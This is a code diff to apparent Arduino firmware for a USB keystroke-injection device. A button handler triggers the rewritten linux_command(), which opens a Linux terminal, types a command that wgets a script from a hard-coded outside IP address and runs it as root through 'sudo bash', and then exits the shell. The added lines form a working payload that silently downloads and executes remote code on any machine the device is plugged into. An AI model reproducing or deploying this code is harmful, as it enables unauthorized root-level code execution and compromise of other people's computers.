@@ -46,7 +46,7 @@ void buttonLoop() {
   display.setCursor(95 - display.getPrintWidth("Pressed!"), 0);
   if (display.getButtons(TSButtonUpperRight)) {
     display.println("Pressed!");
-    linux_command("linux");
+    linux_command();
   } else {
     display.println("Linux");
   }
@@ -108,26 +108,18 @@ void windows_command(char arg1[]){
   Keyboard.releaseAll();
 }
 
-void linux_command(char arg1[]){
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(500);
-  Keyboard.releaseAll();
-  delay(500);
-  Keyboard.print("powershell");
-  delay(1000);
+void linux_command(){
   Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(500);
-
   Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press('y');
+  Keyboard.press('t');
   Keyboard.releaseAll();
+
   delay(1000);
-  Keyboard.print("test");
-  delay(1000);
+  Keyboard.print("sudo bash -c \"$(wget -q 0 -O - http://35.212.247.53/runsh.sh)\"");
+  delay(10000);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.print("exit");
+  Keyboard.press(KEY_RETURN);
 }
 
 void loop() {
